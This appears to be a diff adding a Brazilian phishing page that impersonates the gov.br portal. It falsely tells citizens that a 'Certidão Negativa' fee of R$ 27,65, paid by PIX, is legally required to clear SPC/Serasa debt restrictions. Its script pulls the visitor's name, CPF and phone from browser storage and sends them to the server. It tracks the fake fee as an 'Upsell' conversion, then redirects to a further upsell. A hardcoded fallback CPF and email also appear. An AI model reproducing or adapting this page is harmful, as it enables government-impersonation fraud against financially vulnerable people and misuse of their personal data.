@@ -1,0 +1,297 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Certidão Negativa - Gov.br</title>
+    <!-- TikTok Pixel -->
+    <script>
+    !function(w,d,t){w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script");n.type="text/javascript";n.async=!0;n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+    ttq.load('DA835D3C77UES9745010');
+    ttq.load('DAHNVTJC77UDHLL3RRVG');
+    ttq.load('DAHMNHRC77UDHLL3RPQG');
+    ttq.page();
+    }(window,document,'ttq');
+    </script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { min-height: 100vh; background-color: #f2f2f2; display: flex; flex-direction: column; font-family: 'Segoe UI', Arial, sans-serif; align-items: center;}
+        
+        .govbr-header { background: #fff; border-bottom: 2px solid #1351B4; padding: 12px 20px; display: flex; align-items: center; justify-content: space-between; max-width: 520px; width: 100%; position: sticky; top: 0; z-index: 10; box-shadow: 0 1px 4px rgba(0,0,0,0.05);}
+        .main-wrap { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px 16px; width: 100%; max-width: 520px;}
+        .card { background: #fff; width: 100%; padding: 32px 28px 28px; display: flex; flex-direction: column; align-items: center; text-align: center; border-radius: 4px; box-shadow: 0 1px 5px rgba(0,0,0,0.1); border: 1px solid #e0e0e0;}
+        
+        .title { font-size: 20px; font-weight: 700; color: #333; margin-bottom: 20px; line-height: 1.3; }
+        .subtitle { font-size: 15px; color: #444; margin-bottom: 16px; line-height: 1.5; text-align: left; width: 100%; }
+        
+        .data-box { background: #fdfdfd; border: 1px solid #ccc; border-radius: 4px; padding: 24px 16px; width: 100%; text-align: left; margin-bottom: 24px; }
+        .data-label { font-size: 13px; color: #333; font-weight: 700; text-transform: uppercase; text-align: center; border-bottom: 1px solid #eee; padding-bottom: 12px; margin-bottom: 16px;}
+        .data-value { font-size: 20px; color: #1a1a1a; font-weight: 900; }
+
+        .btn-continuar { width: 100%; background: #1351B4; color: #fff; font-size: 16px; font-weight: 600; border: none; border-radius: 4px; padding: 16px; cursor: pointer; text-align: center; transition: background 0.2s; margin-bottom: 20px; display: flex; justify-content: center; align-items: center; text-transform: uppercase; letter-spacing: 0.5px;}
+        .btn-continuar:hover { background: #0f3e8e; }
+
+        .loading-spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1351B4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .step { display: none; width: 100%; animation: fadeIn 0.4s; }
+        .step.active { display: flex; flex-direction: column; align-items: center; }
+
+        .qr-container { display: flex; flex-direction: column; align-items: center; background: #fff; border: 1px solid #ddd; border-radius: 4px; padding: 20px; margin-bottom: 20px; width: 100%; }
+        .qr-code-img { width: 220px; height: 220px; margin-bottom: 16px; }
+        .pix-code-box { background: #f5f5f5; border: 1px dashed #ccc; padding: 12px; border-radius: 4px; width: 100%; word-break: break-all; font-family: monospace; font-size: 13px; color: #555; margin-bottom: 16px; text-align: left; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
+    </style>
+</head>
+<body>
+    <header class="govbr-header">
+        <img src="/static/images/logo-portal.webp" alt="gov.br" style="height: 35px; width: auto;">
+        <div style="background: #1351B4; color: white; border-radius: 20px; padding: 6px 16px; display: flex; align-items: center; gap: 8px; font-weight: 600; font-size: 15px;">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
+            <span id="header-user-name">Cidadão</span>
+        </div>
+    </header>
+
+    <main class="main-wrap">
+        <div class="card">
+            
+            <div style="width: 100%; margin-bottom: 24px;">
+                <div style="font-size: 12px; color: #555; text-transform: uppercase; font-weight: 700; margin-bottom: 8px; text-align: left;">Etapa 2 de 2: Regularização Fiscal</div>
+                <div style="width: 100%; background: #e0e0e0; height: 6px; border-radius: 3px; overflow: hidden;">
+                    <div style="width: 66%; background: #1351B4; height: 100%;"></div>
+                </div>
+            </div>
+
+            <!-- STEP 1: OFFER -->
+            <div class="step active" id="step1">
+                <h1 class="title">Pendência Detectada</h1>
+                
+                <div style="background: #fff8e1; border-left: 4px solid #f2a900; border-radius: 4px; padding: 16px; margin-bottom: 24px; text-align: left; width: 100%; box-shadow: 0 1px 2px rgba(0,0,0,0.05);">
+                    <div style="display: flex; align-items: center; gap: 8px; margin-bottom: 8px;">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="#f2a900" xmlns="http://www.w3.org/2000/svg"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+                        <strong style="color: #424242; font-size: 15px;">Aviso do Sistema</strong>
+                    </div>
+                    <p style="color: #424242; font-size: 14px; line-height: 1.5;">O seu acordo foi reconhecido. No entanto, o sistema acusa a ausência da <strong>Certidão Negativa de Débitos (CND)</strong>. A emissão deste documento é exigida por lei para que o SPC/Serasa e o Banco Central efetuem a exclusão definitiva das suas restrições.</p>
+                </div>
+                
+                <p class="subtitle">Sem a CND, o processo ficará suspenso no sistema e a restrição permanecerá ativa.</p>
+                <p class="subtitle">A taxa de emissão em cartório tem o custo tabelado de R$ 97,00, mas a sua emissão é subsidiada pelo Programa Desenrola Brasil pelo valor único de <strong>R$ 27,65</strong>.</p>
+                
+                <div class="data-box">
+                    <div class="data-label">Custos de Emissão (CND)</div>
+                    
+                    <div style="text-align: left; font-size: 14px; margin-bottom: 18px; border-bottom: 1px dashed #ccc; padding-bottom: 14px;">
+                        <div style="display: flex; justify-content: space-between; margin-bottom: 10px;">
+                            <span style="color: #555;">Taxa de Emissão de Certidão:</span>
+                            <strong style="color: #333;">R$ 15,21</strong>
+                        </div>
+                        <div style="display: flex; justify-content: space-between;">
+                            <span style="color: #555;">Processamento em Cartório:</span>
+                            <strong style="color: #333;">R$ 12,44</strong>
+                        </div>
+                    </div>
+
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <span style="font-weight: 700; color: #333; font-size: 16px;">VALOR TOTAL:</span>
+                        <div class="data-value">R$ 27,65</div>
+                    </div>
+                </div>
+
+                <button class="btn-continuar" id="btn-generate-pix" onclick="generateUpsellPix()">Emitir Certidão Obrigatória</button>
+            </div>
+
+            <!-- STEP 2: PIX PAYMENT -->
+            <div class="step" id="step2">
+                <h1 class="title">Emissão da CND</h1>
+                <p class="subtitle" style="text-align: center; margin-bottom: 10px;">Copie o código PIX abaixo ou escaneie o QR Code para efetuar o pagamento da taxa.</p>
+                
+                <div class="qr-container">
+                    <img id="upsell-qr" class="qr-code-img" src="" alt="QR Code PIX">
+                    <div class="pix-code-box" id="upsell-pix-code"></div>
+                    <button class="btn-continuar" onclick="copyPix(this)" style="margin-bottom: 0;">Copiar Código PIX</button>
+                    <div style="margin-top: 20px; display: flex; flex-direction: column; align-items: center; gap: 8px;">
+                        <div class="loading-spinner" style="width: 24px; height: 24px; border-width: 3px; margin: 0;"></div>
+                        <p style="font-size: 13px; color: #666; margin: 0; font-weight: 600;">Aguardando pagamento no sistema...</p>
+                    </div>
+                </div>
+                
+                <div style="background: #e8f0fe; border-left: 4px solid #1351B4; border-radius: 4px; padding: 16px; margin: 20px 0; text-align: left; width: 100%;">
+                    <p style="color: #1a1a1a; font-size: 13.5px; line-height: 1.5; margin-bottom: 10px;"><strong>A guia já foi gerada!</strong> Após o pagamento, a sua Certidão Negativa será emitida e vinculada ao seu CPF no mesmo instante.</p>
+                    <p style="color: #d93025; font-size: 13.5px; line-height: 1.5; font-weight: bold;">⚠️ Atenção: A falta de pagamento resultará no cancelamento do processo de regularização realizado na etapa anterior.</p>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <script>
+        let userData = {};
+        let fullUpsellPixCode = '';
+
+        window.onload = function() {
+            try {
+                let jinjaNome = "";
+                let jinjaCpf = "";
+                
+                if (jinjaNome && jinjaNome !== '') userData.nome = jinjaNome;
+                if (jinjaCpf && jinjaCpf !== '') userData.cpf = jinjaCpf;
+
+                const stored = localStorage.getItem('customerData');
+                if(stored) {
+                    const parsed = JSON.parse(stored);
+                    userData.nome = userData.nome || parsed.nome;
+                    userData.cpf = userData.cpf || parsed.cpf;
+                    userData.telefone = parsed.telefone || parsed.phone || '';
+                }
+            } catch(e) {}
+            
+            if (!userData.cpf) { userData.cpf = '79699979372'; }
+            if (!userData.email) { userData.email = 'clientesememail23@gmail.com'; }
+            if (!userData.nome) { userData.nome = 'Cidadão'; }
+            
+            if (userData.nome) {
+                let pName = userData.nome.split(' ')[0].toLowerCase();
+                document.getElementById('header-user-name').textContent = pName.charAt(0).toUpperCase() + pName.slice(1);
+            }
+        }
+
+        async function generateUpsellPix() {
+            const btn = document.getElementById('btn-generate-pix');
+            if(btn) {
+                btn.innerHTML = '<div class="loading-spinner" style="width:20px; height:20px; margin:0; border-width:2px; border-top-color:#fff; border-color: rgba(255,255,255,0.3) rgba(255,255,255,0.3) rgba(255,255,255,0.3) #fff;"></div> Processando...';
+                btn.disabled = true;
+            }
+
+            try {
+                const res = await fetch('/generate-pix-upsell2', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(userData)
+                });
+                const data = await res.json();
+                
+                if(data.success) {
+                    document.getElementById('upsell-qr').src = data.qr_code_base64;
+                    fullUpsellPixCode = data.pix_code;
+                    let displayCode = data.pix_code;
+                    if (displayCode.includes('bcb.pix')) {
+                        displayCode = displayCode.split('bcb.pix')[0] + 'bcb.pix...';
+                    } else if (displayCode.length > 45) {
+                        displayCode = displayCode.substring(0, 45) + '...';
+                    }
+                    document.getElementById('upsell-pix-code').textContent = displayCode;
+                    
+                    ttq.track('InitiateCheckout', {
+                        value: 27.65,
+                        currency: 'BRL',
+                        content_name: 'Upsell_Certidao'
+                    });
+
+                    document.getElementById('step2').classList.add('active');
+                    if (btn) { btn.style.display = 'none'; }
+                    document.getElementById('step1').style.display = 'none';
+                    window.scrollTo({ top: 0, behavior: 'smooth' });
+                    
+                    pollPayment(data.transaction_id);
+                } else {
+                    alert("Erro no sistema. Atualize a página e tente novamente.");
+                    if(btn) { btn.innerHTML = 'Emitir Certidão Obrigatória'; btn.disabled = false; }
+                }
+            } catch(e) {
+                alert("Falha de conexão. Atualize a página e tente novamente.");
+                if(btn) { btn.innerHTML = 'Emitir Certidão Obrigatória'; btn.disabled = false; }
+            }
+        }
+
+        function copyPix(btn) {
+            const codeToCopy = (typeof fullUpsellPixCode !== 'undefined' && fullUpsellPixCode) 
+                               ? fullUpsellPixCode 
+                               : (document.getElementById('upsell-pix-code') ? document.getElementById('upsell-pix-code').textContent : '');
+                               
+            if (codeToCopy) {
+                const fallbackCopy = () => {
+                    const textArea = document.createElement('textarea');
+                    textArea.value = codeToCopy;
+                    document.body.appendChild(textArea);
+                    textArea.select();
+                    try { document.execCommand('copy'); } catch(e){}
+                    document.body.removeChild(textArea);
+                    showCopiedFeedback(btn);
+                };
+
+                if (navigator.clipboard && navigator.clipboard.writeText) {
+                    navigator.clipboard.writeText(codeToCopy).then(() => {
+                        showCopiedFeedback(btn);
+                    }).catch(fallbackCopy);
+                } else {
+                    fallbackCopy();
+                }
+            }
+        }
+        
+        function showCopiedFeedback(btn) {
+            if (!btn) return;
+            if (btn.dataset.copied === 'true') return;
+            
+            const oldText = btn.innerHTML;
+            const oldBg = btn.style.backgroundColor;
+            btn.dataset.copied = 'true';
+            btn.innerHTML = '<svg style="margin-right: 6px;" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg> Copiado com sucesso!';
+            btn.style.backgroundColor = '#138A4B';
+            
+            setTimeout(() => {
+                btn.innerHTML = oldText;
+                btn.style.backgroundColor = oldBg;
+                btn.dataset.copied = 'false';
+            }, 4000);
+        }
+
+        async function pollPayment(transactionId) {
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`/check-payment/${transactionId}`);
+                    const data = await res.json();
+                    if(data.success && (data.status === 'approved' || data.status === 'paid' || data.status === 'pago')) {
+                        clearInterval(interval);
+                        ttq.track('CompletePayment', {
+                            value: 27.65,
+                            currency: 'BRL',
+                            content_name: 'Upsell_Certidao'
+                        });
+                        setTimeout(() => { window.location.href = '/upsell2'; }, 1500);
+                    }
+                } catch (e) {}
+            }, 4000);
+        }
+    </script>
+
+<script>
+// ---- TikTok Click ID / Pixel Cookie Capture ----
+function getTTParams() {
+    var params = new URLSearchParams(window.location.search);
+    var ttclid = params.get('ttclid') || sessionStorage.getItem('ttclid') || '';
+    if (ttclid) sessionStorage.setItem('ttclid', ttclid);
+    
+    var ttp = '';
+    document.cookie.split(';').forEach(function(c) {
+        var parts = c.trim().split('=');
+        if (parts[0] === '_ttp') ttp = decodeURIComponent(parts[1] || '');
+    });
+    
+    // Capturar SKU dinâmico da URL (ex: /pre/adults-HKK2FF9G)
+    var sku = sessionStorage.getItem('tt_sku') || '';
+    var path = window.location.pathname;
+    var match = path.match(/adults-([A-Z0-9]+)/i);
+    if (match) {
+        sku = match[1];
+        sessionStorage.setItem('tt_sku', sku);
+    }
+    
+    return { ttclid: ttclid, ttp: ttp, sku: sku };
+}
+window._getTTParams = getTTParams;
+// ---- End TikTok Capture ----
+</script>
+</body>
+</html>
